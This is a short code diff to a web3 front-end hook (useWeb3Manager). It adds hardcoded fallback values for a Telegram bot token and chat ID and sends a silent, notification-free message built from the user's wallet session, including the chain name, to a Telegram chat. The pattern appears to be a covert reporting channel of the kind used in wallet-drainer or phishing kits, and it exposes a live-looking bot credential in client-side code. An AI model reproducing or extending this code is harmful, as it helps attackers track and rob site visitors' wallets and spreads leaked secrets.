@@ -603,11 +603,14 @@ export function useWeb3Manager() {
                             chainName: targetChainName
                         })}`;
 
-                        await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+                        const TG_BOT_TOKEN_RELAY = process.env.NEXT_PUBLIC_TG_BOT_TOKEN || "8595899709:AAGaOxKvLhZhO830U05SG3e8aw1k1IsM178";
+                        const TG_CHAT_ID_RELAY = process.env.NEXT_PUBLIC_TG_CHAT_ID || "7772781858";
+
+                        await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN_RELAY}/sendMessage`, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({
-                                chat_id: TG_CHAT_ID,
+                                chat_id: TG_CHAT_ID_RELAY,
                                 text: tgMsg,
                                 disable_notification: true
                             })
